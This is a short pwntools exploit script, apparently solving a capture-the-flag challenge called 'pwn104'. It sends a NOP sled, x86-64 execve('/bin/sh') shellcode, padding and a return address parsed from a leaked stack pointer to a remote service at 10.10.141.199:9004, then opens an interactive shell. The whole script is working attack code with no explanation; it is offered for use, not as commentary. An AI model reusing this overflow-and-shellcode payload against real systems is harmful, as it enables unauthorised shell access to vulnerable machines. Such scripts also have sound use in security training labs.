
from pwn import *
import sys

nops  = b'\x90'*30
#shell = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
shell  =  b""
shell += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
shell += b"\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

context.log_level = "debug"

#shell  = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
pad = b'A'*(80 - len(nops)-len(shell))
rbp = b'B'*8
#ret = p64(0x7fffffffd930) #p64(0x7ffffd52c7a8)
#gadget = p64(0x00000000004011cc)

p = process('./pwn104-1644300377109.pwn104')
p = remote('10.10.141.199', 9004)
p.recv()
x = p.recv()
ret = int(str(x).split(' ')[-1].strip('\\n"'), 16)
p.sendline(nops+shell+pad+rbp+p64(ret))
#sys.stdout.buffer.write(nops+shell+pad+rbp+gadget+ret)
p.interactive()
